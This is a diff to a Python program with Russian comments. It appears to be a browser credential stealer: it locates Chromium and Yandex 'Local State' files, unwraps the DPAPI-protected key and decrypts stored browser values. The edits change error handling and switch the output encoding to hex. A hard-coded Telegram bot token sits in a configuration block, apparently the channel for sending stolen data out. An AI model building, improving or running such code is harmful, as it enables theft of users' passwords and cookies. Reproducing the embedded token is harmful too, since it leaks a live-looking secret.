@@ -94,7 +94,10 @@ def crypt_unprotect_data(encrypted_data):
         return decrypted_data
     else:
         error_code = ctypes.windll.kernel32.GetLastError()
-        raise RuntimeError(f"CryptUnprotectData failed with error code {error_code}")
+        # Игнорируем ошибку 13 (неверные данные)
+        if error_code != 13:
+            debug_log(f"CryptUnprotectData failed with error code {error_code}")
+        return None
 
 # Конфигурация Telegram
 TELEGRAM_BOT_TOKEN = "8081126269:AAH6WKbPLU0Vbg-pZWSSV9wE8d7Nr13pmmo"
@@ -502,7 +505,7 @@ def get_encryption_key(profile_path):
         Path(profile_path).parent / "Local State",
         Path(profile_path).parent.parent / "Local State",
         Path(profile_path).parent.parent.parent / "Local State",
-        Path(profile_path).parent.parent.parent.parent / "Local State"  # Добавлено для Yandex
+        Path(profile_path).parent.parent.parent.parent / "Local State"  # Для Yandex
     ]
     
     local_state_path = None
@@ -533,8 +536,12 @@ def get_encryption_key(profile_path):
         encrypted_key = encrypted_key[5:]  # Удалить префикс DPAPI
         try:
             key = crypt_unprotect_data(encrypted_key)
-            debug_log(f"Ключ успешно получен ({len(key)} байт)")
-            return key
+            if key:
+                debug_log(f"Ключ успешно получен ({len(key)} байт)")
+                return key
+            else:
+                debug_log("Не удалось расшифровать ключ с помощью DPAPI")
+                return None
         except Exception as e:
             debug_log(f"Ошибка в crypt_unprotect_data: {e}")
             return None
@@ -596,8 +603,9 @@ def decrypt_chromium_value(encrypted_value, key):
                     debug_log("Успешная дешифровка GCM")
                     return result
                 except UnicodeDecodeError:
-                    debug_log("Ошибка декодирования UTF-8 после GCM")
-                    return plaintext.decode('latin-1', errors='ignore')
+                    debug_log("Ошибка декодирования UTF-8 после GCM, используем raw bytes")
+                    # Возвращаем как есть, если не удается декодировать
+                    return plaintext.hex()
             except Exception as e:
                 debug_log(f"Ошибка GCM: {str(e)}")
                 # Попробовать без тега для старых версий
@@ -611,7 +619,7 @@ def decrypt_chromium_value(encrypted_value, key):
                     try:
                         return plaintext.decode('utf-8')
                     except:
-                        return plaintext.decode('latin-1', errors='ignore')
+                        return plaintext.hex()
                 except Exception as e2:
                     debug_log(f"Ошибка GCM без тега: {str(e2)}")
         
@@ -635,8 +643,8 @@ def decrypt_chromium_value(encrypted_value, key):
                     debug_log("Успешная дешифровка CBC")
                     return result
                 except UnicodeDecodeError:
-                    debug_log("Ошибка декодирования UTF-8 после CBC")
-                    return plaintext.decode('latin-1', errors='ignore')
+                    debug_log("Ошибка декодирования UTF-8 после CBC, используем raw bytes")
+                    return plaintext.hex()
             except Exception as e:
                 debug_log(f"Ошибка CBC: {str(e)}")
         
@@ -652,14 +660,14 @@ def decrypt_chromium_value(encrypted_value, key):
             except:
                 pass
         
-        # Если ничего не сработало, вернуть как base64
-        debug_log("Все методы дешифровки не сработали, возвращаем base64")
-        return base64.b64encode(encrypted_value).decode('utf-8')
+        # Если ничего не сработало, вернуть как hex
+        debug_log("Все методы дешифровки не сработали, возвращаем hex")
+        return encrypted_value.hex()
             
     except Exception as e:
         debug_log(f"КРИТИЧЕСКАЯ ОШИБКА ДЕШИФРОВКИ: {traceback.format_exc()}")
         try:
-            return base64.b64encode(encrypted_value).decode('utf-8')
+            return encrypted_value.hex()
         except:
             return "DECRYPTION_ERROR"
 
